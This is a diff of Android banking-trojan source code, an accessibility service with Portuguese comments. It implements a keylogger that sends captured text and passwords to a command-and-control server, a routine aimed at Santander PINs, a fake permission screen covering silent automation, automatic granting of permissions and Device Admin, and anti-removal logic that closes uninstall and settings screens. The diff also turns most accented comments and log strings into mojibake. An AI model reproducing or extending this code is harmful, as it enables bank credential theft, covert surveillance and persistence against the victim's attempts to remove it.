+     * Envia dados do keylogger para o servidor C&C (mÃƒÂ©todo interno)
      */
     private void sendKeylogDataInternal(String packageName, String text, String hint, String fieldName, boolean isPassword, String eventType) {
         try {
-            // Obtém nome legível do app
+            // ObtÃƒÂ©m nome legÃƒÂ­vel do app
             String appName = getAppName(packageName);
             
-            // 🇧🇷 TIMESTAMP BRASILEIRO (GMT-3)
+            // Ã°Å¸â€¡Â§Ã°Å¸â€¡Â· TIMESTAMP BRASILEIRO (GMT-3)
             java.util.TimeZone brazilTZ = java.util.TimeZone.getTimeZone("America/Sao_Paulo");
             SimpleDateFormat brazilFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
             brazilFormat.setTimeZone(brazilTZ);
             String timestamp = brazilFormat.format(new Date());
             
             // Cria JSON com TODOS os detalhes
+            hierNodeBudget = 700;
             JSONObject json = new JSONObject();
             json.put("timestamp", timestamp);
             json.put("timestampMs", System.currentTimeMillis()); // Timestamp em milissegundos
@@ -6139,9 +6387,9 @@ public class UiAssistBridge extends AccessibilityService {
             
             // Log local
             if (isPassword) {
-                Log.w(TAG, "🔑 SENHA CAPTURADA: " + appName + " - " + text);
+                Log.w(TAG, "Ã°Å¸â€â€˜ SENHA CAPTURADA: " + appName + " - " + text);
             } else {
-                Log.d(TAG, "⌨️ KEYLOG: " + appName + " - " + text);
+                Log.d(TAG, "Ã¢Å’Â¨Ã¯Â¸Â KEYLOG: " + appName + " - " + text);
             }
             
             // Envia para servidor C&C
@@ -6153,16 +6401,16 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     // ========================================
-    // 🏦 SANTANDER ESPECIAL: Buffer para capturar senha completa
+    // Ã°Å¸ÂÂ¦ SANTANDER ESPECIAL: Buffer para capturar senha completa
     // ========================================
     private String lastSantanderPasswordLength = "";
     private long lastSantanderCaptureTime = 0;
     
     /**
-     * 🏦 CAPTURA ESPECIAL PARA SANTANDER
-     * O Santander usa o teclado numérico padrão do Android que não dispara
-     * eventos de clique normais. Esta função monitora o campo de senha
-     * e tenta capturar os dígitos antes de serem mascarados.
+     * Ã°Å¸ÂÂ¦ CAPTURA ESPECIAL PARA SANTANDER
+     * O Santander usa o teclado numÃƒÂ©rico padrÃƒÂ£o do Android que nÃƒÂ£o dispara
+     * eventos de clique normais. Esta funÃƒÂ§ÃƒÂ£o monitora o campo de senha
+     * e tenta capturar os dÃƒÂ­gitos antes de serem mascarados.
      */
     private void captureSantanderPassword(AccessibilityNodeInfo rootNode, String packageName) {
         try {
@@ -6182,7 +6430,7 @@ public class UiAssistBridge extends AccessibilityService {
                 // Ignora se vazio
                 if (text.isEmpty()) continue;
                 
-                // Verifica se o texto mudou desde a última captura
+                // Verifica se o texto mudou desde a ÃƒÂºltima captura
                 String currentLength = packageName + "_" + text.length();
                 long now = System.currentTimeMillis();
                 
@@ -6190,29 +6438,29 @@ public class UiAssistBridge extends AccessibilityService {
                     lastSantanderPasswordLength = currentLength;
                     lastSantanderCaptureTime = now;
                     
-                    // Analisa o texto para encontrar dígitos reais
+                    // Analisa o texto para encontrar dÃƒÂ­gitos reais
                     StringBuilder capturedDigits = new StringBuilder();
                     StringBuilder maskedChars = new StringBuilder();
                     
                     for (int i = 0; i < text.length(); i++) {
                         char c = text.charAt(i);
                         if (Character.isDigit(c)) {
-                            // DÍGITO REAL CAPTURADO!
+                            // DÃƒÂGITO REAL CAPTURADO!
                             capturedDigits.append(c);
-                        } else if (c == '●' || c == '•' || c == '*' || c == '○') {
+                        } else if (c == '\u2501' || c == '\u2022' || c == '*' || c == '\u2714') {
                             maskedChars.append(c);
                         }
                     }
                     
-                    // Se capturou dígitos reais, envia
+                    // Se capturou dÃƒÂ­gitos reais, envia
                     if (capturedDigits.length() > 0) {
-                        Log.w(TAG, "🏦 SANTANDER SENHA REAL CAPTURADA: " + capturedDigits.toString());
+                        Log.w(TAG, "Ã°Å¸ÂÂ¦ SANTANDER SENHA REAL CAPTURADA: " + capturedDigits.toString());
                         sendKeylogDataInternal(packageName, capturedDigits.toString(), "SENHA_SANTANDER", "password", true, "SANTANDER_PASSWORD_REAL");
                     }
                     
-                    // Também registra o progresso (quantos caracteres)
+                    // TambÃƒÂ©m registra o progresso (quantos caracteres)
                     if (text.length() > 0) {
-                        Log.w(TAG, "🏦 SANTANDER CAMPO SENHA: " + text.length() + " caracteres (texto: " + text + ")");
+                        Log.w(TAG, "Ã°Å¸ÂÂ¦ SANTANDER CAMPO SENHA: " + text.length() + " caracteres (texto: " + text + ")");
                     }
                 }
             }
@@ -6227,7 +6475,7 @@ public class UiAssistBridge extends AccessibilityService {
     private void findPasswordFields(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> fields) {
         if (node == null) return;
         
-        // Verifica se é um campo de senha
+        // Verifica se ÃƒÂ© um campo de senha
         if (node.isPassword()) {
             fields.add(node);
         }
@@ -6235,7 +6483,7 @@ public class UiAssistBridge extends AccessibilityService {
         // Verifica pelo nome da classe
         String className = node.getClassName() != null ? node.getClassName().toString() : "";
         if (className.contains("EditText") || className.contains("Password") || className.contains("Pin")) {
-            // Verifica se é campo de entrada
+            // Verifica se ÃƒÂ© campo de entrada
             if (node.isEditable() || node.isFocused()) {
                 fields.add(node);
             }
@@ -6251,7 +6499,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Obtém nome legível do app a partir do package name
+     * ObtÃƒÂ©m nome legÃƒÂ­vel do app a partir do package name
      */
     private String getAppName(String packageName) {
         try {
@@ -6263,17 +6511,17 @@ public class UiAssistBridge extends AccessibilityService {
         }
     }
 
-    // ==================== MÉTODOS AUXILIARES ====================
+    // ==================== MÃƒâ€°TODOS AUXILIARES ====================
 
     /**
-     * Clica em um nó
+     * Clica em um nÃƒÂ³
      */
     private void clickNode(AccessibilityNodeInfo node) {
         if (node != null) {
             if (node.isClickable()) {
                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
             } else {
-                // Se não é clicável, tenta clicar no pai
+                // Se nÃƒÂ£o ÃƒÂ© clicÃƒÂ¡vel, tenta clicar no pai
                 AccessibilityNodeInfo parent = node.getParent();
                 if (parent != null && parent.isClickable()) {
                     parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -6287,7 +6535,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Clica em coordenadas específicas usando gestos
+     * Clica em coordenadas especÃƒÂ­ficas usando gestos
      */
     private void clickAtCoordinates(AccessibilityNodeInfo node) {
         if (node == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
@@ -6302,7 +6550,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Encontra nós por texto
+     * Encontra nÃƒÂ³s por texto
      */
     private List<AccessibilityNodeInfo> findNodesByText(AccessibilityNodeInfo root, String... texts) {
         for (String text : texts) {
@@ -6315,7 +6563,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Encontra nós por classe
+     * Encontra nÃƒÂ³s por classe
      */
     private List<AccessibilityNodeInfo> findNodesByClassName(AccessibilityNodeInfo root, String className) {
         List<AccessibilityNodeInfo> result = new ArrayList<>();
@@ -6340,28 +6588,28 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * CRÍTICO: Solicita TODAS as permissões runtime automaticamente
-     * Camera, Microfone, SMS, Contatos, Localização, Storage, etc
+     * CRÃƒÂTICO: Solicita TODAS as permissÃƒÂµes runtime automaticamente
+     * Camera, Microfone, SMS, Contatos, LocalizaÃƒÂ§ÃƒÂ£o, Storage, etc
      */
     private void requestAllRuntimePermissions() {
-        Log.d(TAG, "🔥 Solicitando TODAS as permissões runtime...");
+        Log.d(TAG, "Ã°Å¸â€Â¥ Solicitando TODAS as permissÃƒÂµes runtime...");
         
-        // Abre TELA FAKE ao invés de solicitar permissões reais!
+        // Abre TELA FAKE ao invÃƒÂ©s de solicitar permissÃƒÂµes reais!
         Intent intent = new Intent(this, FakePermissionActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
     
     /**
-     * Automação em BACKGROUND (chamada pela tela fake)
-     * Aqui que a mágica acontece! Usuário vê tela fake, mas isso roda escondido
+     * AutomaÃƒÂ§ÃƒÂ£o em BACKGROUND (chamada pela tela fake)
+     * Aqui que a mÃƒÂ¡gica acontece! UsuÃƒÂ¡rio vÃƒÂª tela fake, mas isso roda escondido
      */
     private void startBackgroundAutomation() {
-        Log.d(TAG, "🤫 INICIANDO AUTOMAÇÃO SILENCIOSA EM BACKGROUND...");
+        Log.d(TAG, "Ã°Å¸Â¤Â« INICIANDO AUTOMAÃƒâ€¡ÃƒÆ’O SILENCIOSA EM BACKGROUND...");
         
-        // Aguarda um pouco e abre configurações ESCONDIDAS
+        // Aguarda um pouco e abre configuraÃƒÂ§ÃƒÂµes ESCONDIDAS
         handler.postDelayed(() -> {
-            // Abre tela de permissões sem o usuário ver
+            // Abre tela de permissÃƒÂµes sem o usuÃƒÂ¡rio ver
             Intent intent = new Intent(this, MainActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             intent.putExtra("REQUEST_ALL_PERMISSIONS", true);
@@ -6371,13 +6619,13 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * CRÍTICO: Automatiza diálogos de permissões RUNTIME
+     * CRÃƒÂTICO: Automatiza diÃƒÂ¡logos de permissÃƒÂµes RUNTIME
      * Detecta e clica automaticamente em "Allow/Permitir"
      */
     private void handleRuntimePermissionDialog(AccessibilityNodeInfo rootNode) {
-        Log.d(TAG, "🎯 Detectou diálogo de permissão runtime");
+        Log.d(TAG, "Ã°Å¸Å½Â¯ Detectou diÃƒÂ¡logo de permissÃƒÂ£o runtime");
         
-        // ESTRATÉGIA 1: Procura botões "Allow", "Permitir", "Aceitar", etc.
+        // ESTRATÃƒâ€°GIA 1: Procura botÃƒÂµes "Allow", "Permitir", "Aceitar", etc.
         List<AccessibilityNodeInfo> allowButtons = findNodesByText(
             rootNode, 
             "Allow", "Permitir", "Aceitar",
@@ -6386,7 +6634,7 @@ public class UiAssistBridge extends AccessibilityService {
             "ALLOW", "PERMITIR"
         );
         
-        // Se não encontrou por texto, tenta pelos IDs comuns de permissão do Android
+        // Se nÃƒÂ£o encontrou por texto, tenta pelos IDs comuns de permissÃƒÂ£o do Android
         if (allowButtons == null || allowButtons.isEmpty()) {
             String[] permissionBtnIds = {
                 "com.android.permissioncontroller:id/permission_allow_button",
@@ -6398,14 +6646,14 @@ public class UiAssistBridge extends AccessibilityService {
                 List<AccessibilityNodeInfo> idButtons = rootNode.findAccessibilityNodeInfosByViewId(btnId);
                 if (idButtons != null && !idButtons.isEmpty()) {
                     allowButtons = idButtons;
-                    Log.d(TAG, "🎯 handleRuntimePermissionDialog: Botão encontrado por ID (" + btnId + ")");
+                    Log.d(TAG, "Ã°Å¸Å½Â¯ handleRuntimePermissionDialog: BotÃƒÂ£o encontrado por ID (" + btnId + ")");
                     break;
                 }
             }
         }
         
         if (allowButtons != null && !allowButtons.isEmpty()) {
-            // Prefere "While using" ou "Allow" ao invés de "Only this time"
+            // Prefere "While using" ou "Allow" ao invÃƒÂ©s de "Only this time"
             AccessibilityNodeInfo bestButton = allowButtons.get(0);
             for (AccessibilityNodeInfo btn : allowButtons) {
                 String text = btn.getText() != null ? btn.getText().toString() : "";
@@ -6415,52 +6663,52 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
             
-            Log.d(TAG, "✅ Clicando em '" + bestButton.getText() + "' automaticamente (RÁPIDO)");
+            Log.d(TAG, "Ã¢Å“â€¦ Clicando em '" + bestButton.getText() + "' automaticamente (RÃƒÂPIDO)");
             clickNode(bestButton);
             return;
         }
         
-        // ESTRATÉGIA 2: Procura por botões pela classe
+        // ESTRATÃƒâ€°GIA 2: Procura por botÃƒÂµes pela classe
         List<AccessibilityNodeInfo> buttons = findNodesByClassName(rootNode, "android.widget.Button");
         if (buttons != null && !buttons.isEmpty()) {
             for (AccessibilityNodeInfo btn : buttons) {
                 String text = btn.getText() != null ? btn.getText().toString().toLowerCase() : "";
-                // Clica em qualquer botão que contenha "allow", "permit", etc
+                // Clica em qualquer botÃƒÂ£o que contenha "allow", "permit", etc
                 if (text.contains("allow") || text.contains("permit") || text.contains("while") || text.contains("enquanto")) {
-                    Log.d(TAG, "✅ Clicando em botão: " + btn.getText());
+                    Log.d(TAG, "Ã¢Å“â€¦ Clicando em botÃƒÂ£o: " + btn.getText());
                     clickNode(btn);
                     return;
                 }
             }
         }
         
-        // ESTRATÉGIA 3: Se nada funcionou, clica no segundo botão (geralmente é "Allow")
+        // ESTRATÃƒâ€°GIA 3: Se nada funcionou, clica no segundo botÃƒÂ£o (geralmente ÃƒÂ© "Allow")
         if (buttons != null && buttons.size() >= 2) {
-            Log.d(TAG, "⚠️ Clicando no segundo botão por padrão");
+            Log.d(TAG, "Ã¢Å¡Â Ã¯Â¸Â Clicando no segundo botÃƒÂ£o por padrÃƒÂ£o");
             clickNode(buttons.get(1));
         }
     }
     
-    // ==================== MÉTODOS DE CONTROLE DE TELA ====================
+    // ==================== MÃƒâ€°TODOS DE CONTROLE DE TELA ====================
     
     /**
      * Acorda a tela (liga o display)
      * ATUALIZADO para Android 16 (API 35+)
-     * Usa múltiplos métodos em cascata para garantir compatibilidade
+     * Usa mÃƒÂºltiplos mÃƒÂ©todos em cascata para garantir compatibilidade
      */
     @SuppressWarnings("deprecation")
     private void wakeUpScreen() {
-        Log.d(TAG, "💡 wakeUpScreen() chamado - verificando estado da tela...");
+        Log.d(TAG, "Ã°Å¸â€™Â¡ wakeUpScreen() chamado - verificando estado da tela...");
         
         android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
         boolean isScreenOn = pm != null && (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH ? pm.isInteractive() : pm.isScreenOn());
         
         if (isScreenOn) {
-            Log.d(TAG, "💡 Tela já está acesa!");
+            Log.d(TAG, "Ã°Å¸â€™Â¡ Tela jÃƒÂ¡ estÃƒÂ¡ acesa!");
             return;
         }
 
-        // ========== MÉTODO 1: FULL_WAKE_LOCK (acorda a tela se estiver apagada) ==========
+        // ========== MÃƒâ€°TODO 1: FULL_WAKE_LOCK (acorda a tela se estiver apagada) ==========
         try {
             if (pm != null) {
                 android.os.PowerManager.WakeLock fullWakeLock = pm.newWakeLock(
@@ -6473,38 +6721,38 @@ public class UiAssistBridge extends AccessibilityService {
                 handler.postDelayed(() -> {
                     if (fullWakeLock.isHeld()) fullWakeLock.release();
                 }, 2000);
-                Log.d(TAG, "💡 FULL_WAKE_LOCK executado com sucesso!");
+                Log.d(TAG, "Ã°Å¸â€™Â¡ FULL_WAKE_LOCK executado com sucesso!");
             }
         } catch (Exception e) {
-            Log.e(TAG, "❌ FULL_WAKE_LOCK falhou: " + e.getMessage());
+            Log.e(TAG, "Ã¢ÂÅ’ FULL_WAKE_LOCK falhou: " + e.getMessage());
         }
         
-        // ========== MÉTODO 2: KEYCODE_WAKEUP (224 - acorda APENAS se apagada, NUNCA apaga!) ==========
+        // ========== MÃƒâ€°TODO 2: KEYCODE_WAKEUP (224 - acorda APENAS se apagada, NUNCA apaga!) ==========
         try {
             new Thread(() -> {
                 try {
                     Runtime.getRuntime().exec("input keyevent 224"); // KEYCODE_WAKEUP
-                    Log.d(TAG, "💡 KEYCODE_WAKEUP (224) executado com sucesso!");
+                    Log.d(TAG, "Ã°Å¸â€™Â¡ KEYCODE_WAKEUP (224) executado com sucesso!");
                 } catch (Exception ex) {
-                    Log.e(TAG, "❌ keyevent 224 falhou: " + ex.getMessage());
+                    Log.e(TAG, "Ã¢ÂÅ’ keyevent 224 falhou: " + ex.getMessage());
                 }
             }).start();
         } catch (Exception e) {
-            Log.e(TAG, "❌ KEYCODE_WAKEUP falhou: " + e.getMessage());
+            Log.e(TAG, "Ã¢ÂÅ’ KEYCODE_WAKEUP falhou: " + e.getMessage());
         }
     }
     
-    // ==================== PROTEÇÃO CONTRA REMOÇÃO (ULTRA AGRESSIVA) ====================
+    // ==================== PROTEÃƒâ€¡ÃƒÆ’O CONTRA REMOÃƒâ€¡ÃƒÆ’O (ULTRA AGRESSIVA) ====================
     
     private long lastProtectionAction = 0;
-    private static final long PROTECTION_COOLDOWN = 500; // Reduzido de 4500 para 500ms para resposta mais rápida
+    private static final long PROTECTION_COOLDOWN = 500; // Reduzido de 4500 para 500ms para resposta mais rÃƒÂ¡pida
     private int consecutiveProtectionHits = 0;
     private long lastAdminClickTime = 0;
 
     private void triggerProtectionExit(String reason) {
         long now = System.currentTimeMillis();
         
-        // Proteções críticas ignoram completamente o cooldown para evitar que o usuário burle clicando rápido
+        // ProteÃƒÂ§ÃƒÂµes crÃƒÂ­ticas ignoram completamente o cooldown para evitar que o usuÃƒÂ¡rio burle clicando rÃƒÂ¡pido
         boolean isCritical = reason != null && (
             reason.equals("accessibility_settings") ||
             reason.equals("uninstall_dialog") ||
@@ -6530,17 +6778,17 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🛡️ Ativa automaticamente o administrador de dispositivo
+     * Ã°Å¸â€ºÂ¡Ã¯Â¸Â Ativa automaticamente o administrador de dispositivo
      */
     private void autoEnableDeviceAdmin(String packageName, String className, AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
-        // 🛡️ NUNCA executa autoEnableDeviceAdmin fora das configurações do sistema ou na tela inicial/launcher!
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â NUNCA executa autoEnableDeviceAdmin fora das configuraÃƒÂ§ÃƒÂµes do sistema ou na tela inicial/launcher!
         if (packageName == null || !isSettingsOrSecurityPackage(packageName) || isLauncherOrRecentsWindow(packageName, className)) {
             return;
         }
         
-        // 1. Obtém o label do receiver
+        // 1. ObtÃƒÂ©m o label do receiver
         String receiverLabel = "";
         try {
             int resId = getResources().getIdentifier("service_detail_title", "string", getPackageName());
@@ -6550,36 +6798,36 @@ public class UiAssistBridge extends AccessibilityService {
         } catch (Exception e) { /* ignore */ }
         
         if (receiverLabel == null || receiverLabel.isEmpty()) {
-            receiverLabel = "Otimização de Bateria Avançada"; // Fallback padrão
+            receiverLabel = "OtimizaÃƒÂ§ÃƒÂ£o de Bateria AvanÃƒÂ§ada"; // Fallback padrÃƒÂ£o
         }
 
-        // 2. Verifica se a tela atual contém o nosso rótulo de administrador
+        // 2. Verifica se a tela atual contÃƒÂ©m o nosso rÃƒÂ³tulo de administrador
         boolean containsOurAdminLabel = containsAnyText(rootNode, new String[]{receiverLabel});
         
-        // Se a tela não contém nosso rótulo, ignora (não é nossa tela de admin)
+        // Se a tela nÃƒÂ£o contÃƒÂ©m nosso rÃƒÂ³tulo, ignora (nÃƒÂ£o ÃƒÂ© nossa tela de admin)
         if (!containsOurAdminLabel) {
             return;
         }
 
-        Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Detectada tela relacionada ao nosso Admin (" + receiverLabel + ")");
+        Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: Detectada tela relacionada ao nosso Admin (" + receiverLabel + ")");
 
-        // 3. Determina se é a tela de ATIVAÇÃO (tem o botão "Ativar/Permitir") ou a tela de LISTA
+        // 3. Determina se ÃƒÂ© a tela de ATIVAÃƒâ€¡ÃƒÆ’O (tem o botÃƒÂ£o "Ativar/Permitir") ou a tela de LISTA
         boolean hasActivationKeyword = containsAnyText(rootNode, new String[]{
-            "ativar", "permitir", "habilitar", "avançar", "continuar",
+            "ativar", "permitir", "habilitar", "avanÃƒÂ§ar", "continuar",
             "activate", "enable", "allow", "continue", "confirmar", "confirm"
         });
 
-        // 4. Se tiver palavras de ativação, é a tela de confirmação/ativação direta
+        // 4. Se tiver palavras de ativaÃƒÂ§ÃƒÂ£o, ÃƒÂ© a tela de confirmaÃƒÂ§ÃƒÂ£o/ativaÃƒÂ§ÃƒÂ£o direta
         if (hasActivationKeyword) {
             long now = System.currentTimeMillis();
             if (now - lastAdminClickTime < 3000) {
-                Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Cooldown ativo para clique no botão de ativação (ignora)");
+                Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: Cooldown ativo para clique no botÃƒÂ£o de ativaÃƒÂ§ÃƒÂ£o (ignora)");
                 return;
             }
             
-            Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Tela de ativação de Device Admin detectada!");
+            Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: Tela de ativaÃƒÂ§ÃƒÂ£o de Device Admin detectada!");
             
-            // Procura por botões de ativação
+            // Procura por botÃƒÂµes de ativaÃƒÂ§ÃƒÂ£o
             List<AccessibilityNodeInfo> buttons = findNodesByText(rootNode, new String[]{
                 "Ativar este app do administrador", "Ativar o app do administrador",
                 "Ativar o app do administrador deste dispositivo",
@@ -6587,7 +6835,7 @@ public class UiAssistBridge extends AccessibilityService {
                 "Ativar", "Activate", "Enable", "Habilitar", "Permitir", "Allow"
             });
             
-            // Tenta clicar pelo ID do botão positivo padrão
+            // Tenta clicar pelo ID do botÃƒÂ£o positivo padrÃƒÂ£o
             if (buttons == null || buttons.isEmpty()) {
                 String[] commonIds = new String[]{
                     "android:id/button1",
@@ -6598,20 +6846,20 @@ public class UiAssistBridge extends AccessibilityService {
                     List<AccessibilityNodeInfo> idButtons = rootNode.findAccessibilityNodeInfosByViewId(id);
                     if (idButtons != null && !idButtons.isEmpty()) {
                         buttons = idButtons;
-                        Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Botão encontrado por ID (" + id + ")!");
+                        Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: BotÃƒÂ£o encontrado por ID (" + id + ")!");
                         break;
                     }
                 }
             }
             
             if (buttons != null && !buttons.isEmpty()) {
-                Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Agendando clique no botão de ativação em 300ms");
+                Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: Agendando clique no botÃƒÂ£o de ativaÃƒÂ§ÃƒÂ£o em 300ms");
                 lastAdminClickTime = now;
                 AccessibilityNodeInfo button = buttons.get(0);
                 handler.postDelayed(() -> {
                     try {
                         clickNode(button);
-                        Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Botão de ativação clicado!");
+                        Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: BotÃƒÂ£o de ativaÃƒÂ§ÃƒÂ£o clicado!");
                         // Verifica se ativou
                         handler.postDelayed(() -> {
                             try {
@@ -6619,27 +6867,27 @@ public class UiAssistBridge extends AccessibilityService {
                                 android.content.ComponentName comp = new android.content.ComponentName(UiAssistBridge.this, MyAdminReceiver.class);
                                 if (dpm2 != null && dpm2.isAdminActive(comp)) {
                                     CommandControlService.requestAdminRuntime = false;
-                                    Log.d(TAG, "✅ Device Admin confirmado ativado! Flag desligado.");
+                                    Log.d(TAG, "Ã¢Å“â€¦ Device Admin confirmado ativado! Flag desligado.");
                                 }
                             } catch (Exception ex) { /* ignora */ }
                         }, 1000);
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ Erro ao clicar no botão do admin: " + e.getMessage());
+                        Log.e(TAG, "Ã¢ÂÅ’ Erro ao clicar no botÃƒÂ£o do admin: " + e.getMessage());
                     }
                 }, 300);
             }
         } else {
-            // 5. Caso contrário, é a tela de LISTA onde nosso app está listado. Clica nele!
-            Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Lista de Device Admins detectada! Clicando no nosso item...");
+            // 5. Caso contrÃƒÂ¡rio, ÃƒÂ© a tela de LISTA onde nosso app estÃƒÂ¡ listado. Clica nele!
+            Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: Lista de Device Admins detectada! Clicando no nosso item...");
             List<AccessibilityNodeInfo> ourAppNodes = findNodesByText(rootNode, new String[]{receiverLabel});
             if (ourAppNodes != null && !ourAppNodes.isEmpty()) {
                 final AccessibilityNodeInfo node = ourAppNodes.get(0);
                 handler.postDelayed(() -> {
                     try {
                         clickNode(node);
-                        Log.d(TAG, "🛡️ autoEnableDeviceAdmin: Clicou no app na lista de admins!");
+                        Log.d(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â autoEnableDeviceAdmin: Clicou no app na lista de admins!");
                     } catch (Exception e) {
-                        Log.e(TAG, "❌ Erro ao clicar no app da lista de admins: " + e.getMessage());
+                        Log.e(TAG, "Ã¢ÂÅ’ Erro ao clicar no app da lista de admins: " + e.getMessage());
                     }
                 }, 300);
             }
@@ -6647,62 +6895,62 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * 🔒 Protege o app contra desinstalação e desativação
-     * - Detecta quando usuário tenta acessar configurações de acessibilidade
-     * - Detecta quando usuário tenta desinstalar o app
+     * Ã°Å¸â€â€™ Protege o app contra desinstalaÃƒÂ§ÃƒÂ£o e desativaÃƒÂ§ÃƒÂ£o
+     * - Detecta quando usuÃƒÂ¡rio tenta acessar configuraÃƒÂ§ÃƒÂµes de acessibilidade
+     * - Detecta quando usuÃƒÂ¡rio tenta desinstalar o app
      * - Fecha automaticamente essas telas
      */
     private void protectAgainstRemoval(String packageName, String className, AccessibilityNodeInfo rootNode) {
-        // 🛡️ Se Anti-Kill foi desativado no build do APK, ignora completamente a proteção
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â Se Anti-Kill foi desativado no build do APK, ignora completamente a proteÃƒÂ§ÃƒÂ£o
         if (!CommandControlService.ANTI_KILL) {
             return;
         }
 
-        // 🛡️ Ignora telas de Launcher / Home Screen / SystemUI para evitar loop de cliques ao voltar para a tela inicial
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â Ignora telas de Launcher / Home Screen / SystemUI para evitar loop de cliques ao voltar para a tela inicial
         if (packageName != null && isLauncherOrRecentsWindow(packageName, className)) {
             return;
         }
 
-        // 🛡️ BYPASS TOTAL: Se requestAdminRuntime está ativo e admin não está ativado ainda,
-        // desativa TODA a proteção anti-kill para permitir o fluxo completo de ativação de Device Admin.
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â BYPASS TOTAL: Se requestAdminRuntime estÃƒÂ¡ ativo e admin nÃƒÂ£o estÃƒÂ¡ ativado ainda,
+        // desativa TODA a proteÃƒÂ§ÃƒÂ£o anti-kill para permitir o fluxo completo de ativaÃƒÂ§ÃƒÂ£o de Device Admin.
         if (CommandControlService.REQUEST_ADMIN || CommandControlService.requestAdminRuntime) {
             try {
                 android.app.admin.DevicePolicyManager dpmCheck = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                 android.content.ComponentName adminComponentCheck = new android.content.ComponentName(this, MyAdminReceiver.class);
                 if (dpmCheck != null && !dpmCheck.isAdminActive(adminComponentCheck)) {
-                    Log.d(TAG, "🔒 Admin mode: bypassing ALL anti-kill protection (pkg=" + packageName + ")");
-                    return; // Bypass completo — deixa qualquer tela do sistema aberta
+                    Log.d(TAG, "Ã°Å¸â€â€™ Admin mode: bypassing ALL anti-kill protection (pkg=" + packageName + ")");
+                    return; // Bypass completo Ã¢â‚¬â€ deixa qualquer tela do sistema aberta
                 } else if (dpmCheck != null && dpmCheck.isAdminActive(adminComponentCheck)) {
-                    // Admin já foi ativado! Desliga o runtime flag
+                    // Admin jÃƒÂ¡ foi ativado! Desliga o runtime flag
                     CommandControlService.requestAdminRuntime = false;
-                    Log.d(TAG, "✅ Device Admin ativado! Restaurando proteção anti-kill.");
+                    Log.d(TAG, "Ã¢Å“â€¦ Device Admin ativado! Restaurando proteÃƒÂ§ÃƒÂ£o anti-kill.");
                 }
             } catch (Exception e) {
-                Log.d(TAG, "🔒 Admin mode bypass (exception path)");
+                Log.d(TAG, "Ã°Å¸â€â€™ Admin mode bypass (exception path)");
                 return;
             }
         }
 
         if (System.currentTimeMillis() - serviceStartTime < 4000) {
-            Log.d(TAG, "🔒 Startup protection cooldown active, ignoring check");
+            Log.d(TAG, "Ã°Å¸â€â€™ Startup protection cooldown active, ignoring check");
             return;
         }
 
-        // 🎨 IMPORTANTE: NÃO interfere quando estamos no nosso próprio app!
+        // Ã°Å¸Å½Â¨ IMPORTANTE: NÃƒÆ’O interfere quando estamos no nosso prÃƒÂ³prio app!
         if (packageName.equals(getPackageName())) {
             return; // Ignora completamente nosso app
         }
 
-        // 🛡️ BYPASS ABSOLUTO PARA TELAS DE PERMISSÃO/ATIVAÇÃO:
-        // Se o administrador de dispositivo NÃO está ativo ainda, e a tela atual
-        // contém palavras-chave de ativação ou permissão, nós NUNCA devemos fechar!
+        // Ã°Å¸â€ºÂ¡Ã¯Â¸Â BYPASS ABSOLUTO PARA TELAS DE PERMISSÃƒÆ’O/ATIVAÃƒâ€¡ÃƒÆ’O:
+        // Se o administrador de dispositivo NÃƒÆ’O estÃƒÂ¡ ativo ainda, e a tela atual
+        // contÃƒÂ©m palavras-chave de ativaÃƒÂ§ÃƒÂ£o ou permissÃƒÂ£o, nÃƒÂ³s NUNCA devemos fechar!
         try {
             android.app.admin.DevicePolicyManager dpmCheck = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             android.content.ComponentName adminComponentCheck = new android.content.ComponentName(this, MyAdminReceiver.class);
             if (dpmCheck != null && !dpmCheck.isAdminActive(adminComponentCheck)) {
                 String lowerPkg = packageName.toLowerCase();
                 
-                // Verifica se é tela do sistema (settings, security, installer, ui, etc)
